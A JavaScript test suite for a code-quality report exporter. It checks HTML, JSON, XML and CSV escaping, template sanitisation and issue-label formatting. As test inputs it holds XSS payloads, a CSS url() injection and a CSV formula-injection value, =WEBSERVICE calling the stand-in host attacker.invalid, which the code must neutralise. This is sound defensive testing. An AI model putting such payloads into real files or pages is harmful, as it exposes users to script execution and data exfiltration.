import assert from "node:assert/strict";
import test from "node:test";
import { loadApp } from "./test-helpers.mjs";

test("HTML and embedded JSON escaping keep script payloads inert", async () => {
  const app = await loadApp(["core.js"]);
  assert.equal(app.escapeHtml(`<img src=x onerror="alert(1)">`), "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
  assert.equal(app.jsonForHtml({ value: "</script><script>alert(1)</script>" }).includes("</script>"), false);
  assert.match(app.jsonForHtml({ value: "</script>" }), /\\u003c\/script/);
});

test("template validation is declarative, bounded, and sanitized", async () => {
  const app = await loadApp(["core.js"]);
  const template = app.parseTemplateJson(JSON.stringify({
    schemaVersion: 1,
    title: " Test\u0000 title ",
    accentColor: "url(https://attacker.invalid)",
    sections: { issues: false },
    arbitraryScript: "alert(1)"
  }));
  assert.equal(template.title, "Test  title");
  assert.equal(template.accentColor, "#0f766e");
  assert.equal(template.sections.issues, false);
  assert.equal("arbitraryScript" in template, false);
  assert.throws(() => app.parseTemplateJson(JSON.stringify({ schemaVersion: 99 })), /Unsupported/);
  assert.throws(() => app.parseTemplateJson(`{"x":"${"a".repeat(70000)}"}`), /64 KiB/);
});

test("CSV neutralizes formula injection and follows RFC 4180 quoting", async () => {
  const app = await loadApp(["core.js"]);
  const csv = app.toCsv([
    ["message", "path"],
    [`\t=WEBSERVICE("https://attacker.invalid")`, "a,b\nline"]
  ]);
  assert.ok(csv.startsWith("\uFEFF"));
  assert.match(csv, /"'\t=WEBSERVICE\(""https:\/\/attacker\.invalid""\)"/);
  assert.match(csv, /"a,b\r\nline"/);
});

test("formula neutralization covers leading controls and locale-specific full-width initiators", async () => {
  const app = await loadApp(["core.js"]);
  for (const prefix of ["", " ", "\t", "\r", "\n", "\u0000"]) {
    for (const initiator of ["=", "+", "-", "@", "＝", "＋", "－", "＠"]) {
      assert.ok(app.formulaSafe(`${prefix}${initiator}1+1`).startsWith("'"), `${JSON.stringify(prefix + initiator)} was not neutralized`);
    }
  }
});

test("XML sanitization preserves valid Unicode and replaces every invalid XML 1.0 scalar", async () => {
  const app = await loadApp(["core.js"]);
  const source = `ok😀e\u0301\u0001\uFFFE\uFFFF\uD800x\uDC00<&`;
  const sanitized = app.xmlSafeText(source);
  assert.match(sanitized, /ok😀e\u0301/);
  assert.doesNotMatch(sanitized, /[\u0001\uFFFE\uFFFF\uD800-\uDFFF]/u);
  assert.ok((sanitized.match(/\uFFFD/g) || []).length >= 5);
  assert.match(app.xmlEscape(source), /&lt;&amp;/);
});

test("shared issue lifecycle honors the normalized model before legacy fields", async () => {
  const app = await loadApp(["core.js"]);
  assert.equal(app.issueLifecycle({ lifecycleStatus: "closed", status: "OPEN" }), "closed");
  assert.equal(app.issueLifecycle({ status: "OPEN", resolution: "FIXED" }), "actionable");
  assert.equal(app.issueLifecycle({ status: "FUTURE_STATE" }), "unknown");
});

test("CSV issue exports use professional labels instead of raw Sonar enum tokens", async () => {
  const app = await loadApp(["core.js"]);
  const rows = app.issueRows({
    rules: [{ key: "typescript:S1", name: "Readable Rule" }],
    issues: [{
      key: "I-1", rule: "typescript:S1", type: "CODE_SMELL", severity: "MAJOR",
      impacts: ["MAINTAINABILITY:HIGH"], status: "FALSE-POSITIVE", resolution: "WONTFIX",
      message: "Review this code.", component: "sample:src/app.ts", project: "sample", line: 9,
      effort: "10min", tags: ["brain_overload"], cleanCodeAttribute: "CONVENTIONAL",
      textRange: { startLine: 9, endLine: 9, startOffset: 2, endOffset: 14 },
      creationDate: "2026-08-18T10:00:00Z", updateDate: "2026-08-18T11:00:00Z"
    }]
  });
  const csv = app.toCsv(rows);
  assert.match(csv, /"Code Smell"/);
  assert.match(csv, /"Maintainability – High"/);
  assert.match(csv, /"False Positive"/);
  assert.match(csv, /"Won't Fix"/);
  assert.match(csv, /"Brain Overload"/);
  assert.match(csv, /"Line 9, columns 2–14"/);
  assert.doesNotMatch(csv, /CODE_SMELL|MAINTAINABILITY:HIGH|FALSE-POSITIVE|brain_overload/);
});

test("Blob download keeps its anchor and URL alive until the browser starts the transfer", async () => {
  const events = [];
  let cleanup;
  const link = {
    style: {},
    setAttribute(name, value) { events.push(["attribute", name, value]); },
    click() { events.push(["click"]); },
    remove() { events.push(["remove"]); }
  };
  const app = await loadApp(["core.js"], {
    document: {
      createElement(name) { assert.equal(name, "a"); return link; },
      body: { appendChild(value) { assert.equal(value, link); events.push(["append"]); } }
    },
    URL: {
      createObjectURL() { events.push(["create-url"]); return "blob:test"; },
      revokeObjectURL(value) { events.push(["revoke-url", value]); }
    },
    setTimeout(callback, delay) { cleanup = callback; events.push(["timeout", delay]); return 1; }
  });

  app.downloadBlob(new Blob(["report"]), "report.html");
  assert.equal(link.href, "blob:test");
  assert.equal(link.download, "report.html");
  assert.deepEqual(events.map((event) => event[0]), ["create-url", "attribute", "append", "click", "timeout"]);
  assert.deepEqual(events.at(-1), ["timeout", 30000]);

  cleanup();
  assert.deepEqual(events.slice(-2), [["remove"], ["revoke-url", "blob:test"]]);
});
